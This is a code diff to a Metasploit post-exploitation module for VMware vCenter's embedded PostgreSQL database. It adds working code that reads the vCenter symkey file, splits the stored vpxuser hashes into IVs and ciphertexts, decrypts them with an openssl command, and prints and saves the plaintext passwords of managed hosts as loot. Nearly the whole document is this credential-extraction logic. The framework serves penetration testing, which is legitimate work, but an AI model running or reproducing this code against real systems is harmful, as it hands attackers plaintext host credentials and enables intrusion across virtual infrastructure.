@@ -24,7 +24,7 @@ class MetasploitModule < Msf::Post
       'Actions' => [
         [ 'HASHDUMP', { 'Description' => 'Dump the PostgreSQL usernames and password hashes' } ],
         [ 'CUSTOM_QUERY', { 'Description' => 'Run a custom PostgreSQL query against the embedded database' } ],
-        [ 'VPXUSER_HASHDUMP', { 'Description' => 'Dump the password hashes for the vpxuser from the VCDB' } ],
+        [ 'VPXUSER_HASHDUMP', { 'Description' => 'Dump the password hashes for the vpxuser from the VCDB. If you have root privielges, the module will try to decrypt the hashes.' } ],
         [ 'VPXV_VMS', { 'Description' => 'Print information about virtual machines located on the server' } ],
       ],
       'DefaultAction' => 'HASHDUMP',
@@ -67,6 +67,10 @@ class MetasploitModule < Msf::Post
 
   def vpostgres_vmware_dir
     '/opt/vmware/vpostgres'
+  end
+
+  def symkey_path
+    '/etc/vmware-vpx/ssl/symkey.dat'
   end
 
   def load_file(fname)
@@ -208,7 +212,7 @@ class MetasploitModule < Msf::Post
     when 'CUSTOM_QUERY'
       return query
     when 'VPXUSER_HASHDUMP'
-      return 'SELECT user_name, password, local_ip_address, dns_name FROM VPX_HOST;'
+      return 'SELECT user_name, password, local_ip_address, ip_address, dns_name FROM VPX_HOST;'
     when 'VPXV_VMS'
       return 'SELECT vmid, name, configfilename, guest_state, is_template FROM vpxv_vms;'
     end
@@ -288,22 +292,72 @@ class MetasploitModule < Msf::Post
     query_result
   end
 
-  def crack_vpxuser_passwords(query_result)
+  def get_symkey
+    print_status("Attempting to obtain the symkey that can be used to decrypt the vpxuser hashes from #{symkey_path}")
+    unless file_exist?(symkey_path)
+      print_error("Cannot find #{symkey_path} on the target.")
+      return 1
+    end
+
+    load_file(symkey_path).strip
+  end
+
+  def obtain_secretb64_and_vi(vpxuser_hash)
+    secret_bytes = Base64.decode64(vpxuser_hash).bytes
+    iv = secret_bytes[0..15].pack("c*").unpack("H*").first
+    secret_b64 = Base64.strict_encode64(secret_bytes[16..63].pack("c*"))
+    [iv, secret_b64]
+  end
+
+  def decrypt_vpxuser_passwords(query_result, symkey)
     query_lines = query_result.split("\n")
     # check if actually received any results. We should have at least 4 lines, since the first two lines contain the table headers, and the last one the number of rows
     return 1 unless query_lines.length >= 4
-    
+    vpxuser_results = []
     cred_lines = query_result.split("\n")[2..-2]
     print_status("Attempting to crack the #{cred_lines.length} vpxuser passwords we have obtained.")
     cred_lines.each do |cline|
-      username, hash, local_ip, dns_name = cline.split(/\s+\|\s+/)
-      hash = hash.split('*')[1..].join
-      username = username.strip
+      cline = cline.strip
+      username, vpxuser_hash, local_ip, remote_ip, dns_name = cline.split(/\s+\|\s+/)
+      vpxuser_hash = vpxuser_hash.delete_suffix('*')
       # we need values for all 4 variables for the creds to be useable
-      return 1 if [username, hash, local_ip, dns_name].any? {|i| i.nil? || i.empty? }
+      next if [username, vpxuser_hash, local_ip, remote_ip, dns_name].any? {|i| i.nil? || i.empty? }
 
-      # TODO: use magic to crack passwords
+      if remote_ip == dns_name
+        remote_ip_dns = remote_ip
+      else
+        remote_ip_dns = "#{remote_ip} (#{dns_name})"
+      end
+
+      print_status("Attempting to decrypt the #{username} hash for the remote host #{remote_ip_dns}")
+      iv, secret_b64 = obtain_secretb64_and_vi(vpxuser_hash)
+      vprint_status("Obtained Initialization Vector (IV): #{iv} and the secret #{secret_b64}")
+      openssl_cmd = %(echo '#{secret_b64}' | openssl enc -aes-256-cbc -A -a -d -K #{symkey} -iv #{iv})
+      print_status("Using the following command: #{openssl_cmd}")
+      password = cmd_exec(openssl_cmd)
+      if password.include?('bad decrypt')
+        print_error("Decryption failed for the #{username} credentials on remote host #{remote_ip_dns}")
+        next
+      end
+
+      print_good("Password decrypted! Remote host:#{remote_ip_dns} - Username:#{username} - Password:#{password}")
+      vpxuser_results << {
+        'username' => username,
+        'hash' => vpxuser_hash,
+        'password' => password,
+        'iv' => iv,
+        'secret' => secret_b64,
+        'local_ip' => local_ip,
+        'remote_ip_dns' => remote_ip_dns
+      }
     end
+
+    if vpxuser_results.empty?
+      print_error("Failed to obtain any plaintext credentials.")
+      return 1
+    end
+
+    vpxuser_results
   end
 
   def run
@@ -346,7 +400,17 @@ class MetasploitModule < Msf::Post
     query_result = perform_action(bin_to_use, db_config_or_error_msg, grab_query)
     # if we obtained the VPXUSER passwords, let's see if we have the privileges to decrypt them    
     if action.name == 'VPXUSER_HASHDUMP' && is_root?
-      crack_vpxuser_passwords(query_result)
+      symkey = get_symkey
+      unless symkey == 1
+        print_good("Obtained the following symkey: #{symkey}")
+        vpxuser_results = decrypt_vpxuser_passwords(query_result, symkey)
+        unless vpxuser_results == 1
+          # save the results in pretty JSON format
+          filename = 'vpxuser_pwds'
+          path = store_loot(filename, 'application/json', session, JSON.pretty_generate(vpxuser_results), "vcenter_#{filename}.json")
+          print_good("Saving #{vpxuser_results.length} plaintext vpxuser credentials in JSON format to #{path}")
+        end
+      end
     end
   end
 end
